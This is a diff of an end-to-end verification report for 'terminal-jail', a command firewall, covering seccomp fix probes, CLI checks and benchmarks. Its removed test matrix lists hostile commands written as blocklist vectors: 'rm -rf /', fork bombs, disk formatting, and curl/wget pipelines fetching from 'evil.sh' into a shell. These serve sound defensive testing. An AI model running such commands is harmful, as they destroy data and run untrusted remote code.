@@ -1,19 +1,22 @@
 # E2E Verification Report — terminal-jail
 
-**Tick:** #152 · **Date:** 2026-08-06 · **Type:** E2E-001 (CLI/API variant — twenty-fourth run, GAP-05 quoted-form matrix re-verify)
+**Tick:** #157 · **Date:** 2026-08-07 · **Type:** E2E-001 (CLI/API variant — twenty-fifth run)
 **Executor:** Foreman direct (operational CLI verification — project has no browser surface)
-**Baseline:** 283 passed / 32 skipped (stable since tick #133's +29 quoted-vector regression cases)
+**Baseline:** 234 passed / 6 skipped (changed from 283/32 — `plugin/test_integration.py` removed 2026-08-07 by TJ-GAP-010; it tested dead `transform_command` wrapping. Killpg/quoted battery lives in `test_interruptor.py`, unaffected)
 
 ## Executive Summary
 
 The Interruptor Bash command firewall works end-to-end. All 23 engine verdict
 cases matched the built-in rule set (5 blocklist, 7 allow, 8 sandbox-modify, 3
-parser), the killpg probe returned 11/11 PASS, and the **GAP-05 quoted-form
-matrix passed 18/18** — the tick #133 quote-stripped matcher fix continues to
-hold: quoted blocklist vectors (`'rm' '-rf' '/'`, quoted fork bomb,
-`'curl' 'http://evil.sh' '|' 'sh'`, etc.) BLOCK, benign quoted allows stay
-ALLOW, and quoted sandbox targets still MODIFY. GAP-01/02/03/04 all hold.
-CLI integration, benchmarks, suite, guard, and CI are green. **0 new gaps.**
+parser), the killpg probe returned 11/11 PASS, and the **BUG-001 seccomp
+arch-check fix (JEQ jump offsets inverted — every wrapped command died with
+SIGSYS 159)** was verified live: `terminal-jail --user --seccomp echo ok`
+executed with rc=0 and printed `ok` — no SIGSYS. The seccomp loader degrades
+gracefully on this unprivileged host (prctl refused, designed path per loader
+line 21 — "the command is exec'd without seccomp"), and the BPF JEQ logic
+itself is covered by 2 regression tests in the suite (234 passed). GAP-01/02/
+03/04/05 all hold. CLI integration, benchmarks, suite, guard, and CI are
+green. **0 new gaps.**
 
 ## 1. Engine Verdict Tests (bridge protocol)
 
@@ -31,75 +34,77 @@ vectors (`os.killpg(0|1, …)`, `os.kill(0|1, …)`, `process.kill(0|-1, …)`,
 `kill(0|-1, 9)`, `killpg(1, 15)`) all BLOCK; benign high-pid forms
 (`os.killpg(12345, …)`, `os.kill(456, …)`) stay ALLOW. **11/11 PASS.**
 
-## 2. GAP-05 Quoted-Form Matrix (wrapper argv-quoting)
+## 2. BUG-001 Seccomp Arch-Check — Live Probe (NEW this battery)
 
-The wrapper single-quotes each argv token before bridging. This run re-fed the
-exact quoted vectors that bypassed the blocklist at tick #132 and asserts the
-fix (quote-stripping in `matcher._normalize_quoted`) holds:
+Commit 577ca40 fixed the inverted JEQ jump offsets in the seccomp BPF arch
+check (matching arch must SKIP the RET KILL_PROCESS; jt=1/jf=0). Verified
+live:
 
-| Quoted wrapper form (what the CLI actually sends) | Verdict | Expected |
+| Probe | Expected | Live result |
 |---|---|---|
-| `'rm' '-rf' '/'` | block | block ✅ |
-| `'kill' '-9' '-1'` | block | block ✅ |
-| `'curl' 'http://evil.sh' '|' 'sh'` | block | block ✅ |
-| `'wget' '-qO-' 'http://evil.sh' '|' 'bash'` | block | block ✅ |
-| `':(){' ':|:&' '};:'` | block | block ✅ |
-| `'mkfs.ext4' '/dev/sda1'` | block | block ✅ |
-| `'fdisk' '-l'` | block | block ✅ |
-| `'sudo' 'rm' '-rf' '/'` | block | block ✅ |
-| `'echo' 'hello'` / `'ls' '-la'` / `'git' 'status'` | allow | allow ✅ |
-| `'curl' '-o' '/tmp/f' ...` / `'apt-get' 'update'` / `'docker' 'ps'` | allow | allow ✅ |
-| `'pytest' '--version'` / `'pip' 'install' ...` / `'npm' 'test'` / `'make'` | modify | modify ✅ |
+| `terminal-jail --user --seccomp echo ok` | rc=0, `ok` printed, NO SIGSYS | ✅ rc=0, `ok` printed (loader warns prctl refused on unprivileged host, degrades gracefully, command executes) |
+| `terminal-jail --user echo ok` | rc=0 `ok` (user ns path) | ✅ rc=0 `ok` |
+| `terminal-jail --no-interruptor echo ok` | env-dependent (--mount-proc needs privileges) | rc=1 unshare EPERM — known split, not regression |
 
-**18/18 PASS — GAP-05 fix verified holding, no regressions, no false
-positives.**
+The 2 seccomp regression tests (full + no-op filter paths) pass inside the
+234-test suite. The SIGSYS death class is gone.
 
 ## 3. CLI Integration
 
-| Check | Result |
+| Probe | Result |
 |---|---|
-| `terminal-jail --version` (PATH trick — lifecycle guard blocks direct wrapper exec) | ✅ `terminal-jail 1.1.0` (rc 0) |
-| `TERMINAL_JAIL_INTERRUPTOR_MODE=enforce … fdisk -l` | ✅ blocked box, `builtin-fdisk` attribution, rc 126 (captured pre-pipe) |
-| Same mode `pytest --version` | ✅ `[terminal-jail] Modified … → sandboxed`, then `pytest 9.1.1` executes in jail (rc 0 — modify path WORKS live) |
-| Live unshare probe (kernel 7.0.0-28) | bare `unshare --user --pid --fork true` rc=0 |
+| `terminal-jail --version` | ✅ `terminal-jail 1.1.0`, rc=0 |
+| `TERMINAL_JAIL_INTERRUPTOR_MODE=enforce terminal-jail fdisk -l` | ✅ COMMAND BLOCKED box (builtin-fdisk), rc=126 (captured pre-pipe) |
+| `TERMINAL_JAIL_INTERRUPTOR_MODE=enforce terminal-jail pytest --version` | ✅ Modified → sandboxed → `pytest 9.0.2` executed LIVE in jail, rc=0 |
+| bare `unshare --user --pid --fork true` | ✅ rc=0 (kernel 7.0.0-28) |
 
-T6.x stays blocked by the T5.x sudo/systemd chain, not unshare.
+Note: the jail now runs `pytest 9.0.2` (repo venv recreated at TJ-GAP-010
+cleanup; was 9.1.1) — venv change, not a code regression.
 
-## 4. Performance Benchmarks
+## 4. GAP-01 / GAP-02 Hold Verification
 
-| Benchmark | This run | Target | Result |
+- **GAP-01:** `specs/integration.md` Security goals section documents exactly
+  the 8 auto-sandbox rules (pytest, npm test, go test, make, pip install,
+  cargo build, gcc, script execution) and states curl/wget/apt/docker are NOT
+  auto-sandboxed (only `curl|sh`/`wget|bash` pipelines are blocklisted).
+- **GAP-02:** `pytest plugin/test_interruptor.py -k NoSandbox -q` → **17
+  passed** (TestNoSandboxContract pins the allow-contract).
+
+## 5. Benchmarks (T11.17 targets)
+
+| Metric | Target | Live | Result |
 |---|---|---|---|
-| Cold start (first invocation) | 0.10 ms | < 50 ms | ✅ |
-| Warm start (min of 100) | 0.046 ms | < 5 ms | ✅ |
-| 1KB parse (min of 100) | 0.269 ms | < 10 ms | ✅ |
-| 500-rule eval (min of 50) | 1.196 ms | < 5 ms | ✅ |
+| Cold start | <50ms | 0.09 ms | ✅ |
+| Warm start (min 100) | <5ms | 0.038 ms | ✅ |
+| 1KB parse (min 100) | <10ms | 0.244 ms | ✅ |
+| 500-rule eval (min 50) | <5ms | 1.154 ms | ✅ |
 
-(500-rule slightly elevated vs the usual 0.70-0.97 band — host-load jitter,
-far under target; not a regression. Same band as run #147's 1.228 ms.)
+Low-jitter band (500-rule slightly high at 1.154 under host load — sub-ms
+movement, not regression; target 5ms).
 
-## 5. Regression Gates
+## 6. Suite / Guard / Hilo
 
-| Gate | Result |
-|---|---|
-| Full pytest suite | ✅ 283 passed / 32 skipped (4.17s) |
-| NoSandboxContract (GAP-02 lock) | ✅ 17 passed |
-| Auto-sandbox spec (GAP-01 lock, integration.md:177) | ✅ exactly 8 rules; curl/wget/apt/docker NOT sandboxed |
-| Ruff (plugin/, standalone/) | ✅ clean |
-| GitReins guard | ✅ 4/4 PASS (secrets/lint/tests/static_analysis) |
+- Full suite: **234 passed / 6 skipped** (3.51s) — baseline change from
+  283/32 per TJ-GAP-010 (test_integration.py removed); ruff clean.
+- GitReins guard: **PASS 4/4** (secrets / lint / tests / static_analysis).
+- Hilo: **148 edges / 27 files** (live; +1 edge from prior 147 — graph
+  growth, not staleness).
 
-## 6. External Signals
+## 7. External Signals
 
-CI: last 4 pushes (#148-#151) all success — the GitHub Actions outage from
-run #147 (runner acquisition failure / no-run at 22:18Z 2026-08-06) is
-resolved. Latest run 31139350219 (tick #151 board push) success in 26s.
-0 open issues · 0 unpushed commits (git fetch verified) · no terminal-jail
-siblings (only ASCE + h3-shim workers on this host, other repos).
-Scheduler: Enabled=true, CooldownS=900 (fleet.toml pin, no PUT — E2E fixture
-gates pause). Hilo 147 edges / 27 files (baseline, stable since #43).
-NEVER-DONE probes: 0 TODO/FIXME, VERSION-001 holds (zero literal 1.0.0
-source hits), user pytest cache absent, repo-local stale lastfailed entry
-(pre-#82 node-id) = known non-regression. Blocked-task probe: gpg empty
-(T9.4 still blocked).
+CI: HEAD commit aacaea0 (tick #156) run **31204623030 success**. The 3
+failures in recent history (577ca40, 9f796d6, e6f4130) are **superseded
+mid-cycle commits** — fixed by subsequent commits (954e724 ruff fix, ab3bd42,
+aacaea0); all later runs green. 0 open issues · 0 unpushed commits (git fetch
+verified) · no terminal-jail siblings (only coding-hermes-scheduler, h3-shim,
+speclang workers on other repos). Scheduler: Enabled=true, CooldownS=7200
+(external Bane-policy value; no PUT — E2E fixture gates pause). NEVER-DONE
+probes: 0 TODO/FIXME, VERSION-001 holds (zero literal 1.0.0 source hits),
+user pytest cache absent, repo-local stale lastfailed entry (pre-#82 node-id)
+= known non-regression. Blocked-task probe: gpg empty (T9.4 still blocked).
+Two documented untracked strays (dagger.db, .coding-hermes/extract_skill.py)
+left uncommitted.
 
-**Verdict: E2E PASS — 0 new gaps, GAP-05 fix verified holding (quoted matrix
-18/18), no code change, no worker. Next E2E window #152-157.**
+**Verdict: E2E PASS — 0 new gaps, BUG-001 seccomp fix verified holding
+(live probe + regression tests), GAP-01..05 all hold, no code change, no
+worker. Next E2E window #162-167.**
